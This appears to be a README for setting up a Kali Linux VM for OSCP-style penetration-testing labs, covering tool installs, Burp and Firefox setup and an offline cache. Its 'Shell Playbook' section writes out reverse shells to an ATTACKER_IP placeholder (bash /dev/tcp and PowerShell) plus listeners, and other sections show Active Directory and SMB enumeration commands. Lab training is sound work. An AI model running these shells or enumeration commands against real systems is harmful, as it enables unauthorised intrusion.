# Kali Linux Initial Setup (OSCP / Labs)

This README is a **first-boot checklist and reference** for setting up a fresh Kali Linux VM for OSCP-style labs and general pentesting.

Philosophy:

* Minimize manual clicks.
* Install everything once.
* Cache what you need offline.
* Keep tooling predictable.

This guide is organized **top-down in execution order**.

---

## 0. Assumptions

* Kali Linux **kali-linux-default** desktop image
* You have sudo access
* Internet access is available during setup
* You will later replace parts of this with custom scripts

---

## 1. One-Liner: Full Base Setup (Fast Path)

This installs **everything except Nessus** in one go.

```bash
sudo apt update && sudo apt install -y \
  git curl wget rlwrap socat \
  bloodhound sharphound crackmapexec \
  nuclei subfinder httpx-toolkit getallurls arjun \
  rubeus seclists \
  firefox-esr burpsuite \
  golang-go neo4j && \
  nuclei -update-templates
```

Upstream (non-Kali) tools:

```bash
# Kerbrute
wget -O kerbrute https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 && \
chmod +x kerbrute && sudo mv kerbrute /usr/local/bin/

# Katana
go install github.com/projectdiscovery/katana/cmd/katana@latest && \
sudo cp ~/go/bin/katana /usr/local/bin/katana

# Dalfox
go install github.com/hahwul/dalfox/v2@latest && \
sudo cp ~/go/bin/dalfox /usr/local/bin/dalfox
```

Clone common repos:

```bash
mkdir -p ~/tools && cd ~/tools && \
git clone https://github.com/danielmiessler/SecLists.git && \
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git && \
git clone https://github.com/projectdiscovery/nuclei-templates.git
```

---

## 2. Pimp My Kali (Temporary Bootstrap)

This is a **temporary convenience layer** until custom scripts replace it.

### Install

```bash
git clone https://github.com/Dewalt-arch/pimpmykali.git ~/tools/pimpmykali
cd ~/tools/pimpmykali
sudo ./pimpmykali.sh
```

### Recommended Options

* System update and upgrade
* Core pentesting tools
* Wordlists and extra utilities
* Shell quality-of-life improvements

Avoid:

* Heavy desktop theming
* Niche tools you do not recognize

Goal is **baseline parity**, not bloat.

---

## 3. Browser Setup (Firefox ESR)

### Install Burp CA Certificate

1. Start Burp
2. Proxy tab → Open browser (or manual Firefox)
3. Visit `http://burp`
4. Download CA certificate
5. Firefox Settings → Privacy & Security → Certificates → Import
6. Trust for identifying websites

### Required Add-ons

Install from Firefox Add-ons:

* **FoxyProxy Standard**
* **Wappalyzer**
* **Hack-Tools**

### FoxyProxy

* Create profile: `Burp`
* Proxy: `127.0.0.1:8080`
* Default mode: Disabled
* Toggle only when testing

### Import Bookmarks

```bash
git clone https://github.com/YOUR_GITHUB/bookmarks.git ~/bookmarks
```

Firefox → Bookmarks → Manage → Import HTML → select file

---

## 4. Burp Suite Setup

* Disable auto-updates (lab stability)
* Set temporary project directory
* Enable Logger
* Set scope aggressively

Optional:

* Install extensions only if needed

---

## 5. Tooling Not in Default Kali (Individual Installs)

### BloodHound CE + Neo4j

```bash
sudo apt install -y bloodhound neo4j
sudo bloodhound-setup
sudo bloodhound
```

Access:

```
http://localhost:7474
```

Use:

* Import SharpHound zip
* Run "Shortest Paths to Domain Admins"

---

### SharpHound

```bash
sudo apt install -y sharphound
ls -la /usr/share/sharphound
```

Windows usage:

```powershell
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
```

---

### CrackMapExec

```bash
sudo apt install -y crackmapexec
```

Examples:

```bash
crackmapexec smb 10.10.10.0/24
crackmapexec smb 10.10.10.10 -u user -p pass --shares
```

---

### Nuclei

```bash
sudo apt install -y nuclei
nuclei -update-templates
```

---

### Subfinder

```bash
sudo apt install -y subfinder
subfinder -d target.tld -silent
```

---

### httpx

```bash
sudo apt install -y httpx-toolkit
cat subs.txt | httpx -mc 200 -title -tech-detect
```

---

### GAU

```bash
sudo apt install -y getallurls
getallurls target.tld
```

---

### Arjun

```bash
sudo apt install -y arjun
arjun -u https://target/search.php -m GET
```

---

### Rubeus

```bash
sudo apt install -y rubeus
ls /usr/share/windows-resources/rubeus/
```

---

### Kerbrute

```bash
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

---

### Katana

```bash
katana -u https://target.tld -silent
```

---

### Dalfox

```bash
dalfox url "https://target/page.php?x=1"
```

---

## 6. OSCP Shell Playbook (Local Reference)

### Listeners

```bash
rlwrap nc -lvnp 4444
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### Linux Reverse Shells

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Windows Reverse Shells

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);..."
```

### TTY Upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 7. Offline Cache (Critical)

```bash
mkdir -p ~/oscp/offline && cd ~/oscp/offline
```

Clone:

```bash
git clone https://github.com/carlospolop/PEASS-ng.git
git clone https://github.com/GTFOBins/GTFOBins.github.io.git
git clone https://github.com/LOLBAS-Project/LOLBAS.git
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
git clone https://github.com/danielmiessler/SecLists.git
```

Verify:

```bash
ls ~/oscp/offline
```

---

## 8. Optional: Nessus (Install Only If Required)

Do **not** include Nessus in one-liners.

High-level steps:

1. Download Nessus .deb from Tenable
2. Install

   ```bash
   sudo dpkg -i Nessus-*.deb
   sudo systemctl start nessusd
   ```
3. Browse to `https://localhost:8834`
4. Activate (Essentials or licensed)
5. Create local user

Only install if:

* Lab explicitly allows it
* Time cost is justified

---

## 9. Final Notes

* Snapshot the VM after completion
* Keep tooling minimal during exams
* Prefer manual exploitation over automation

This README is a **living document**. Replace sections with scripts as automation matures.
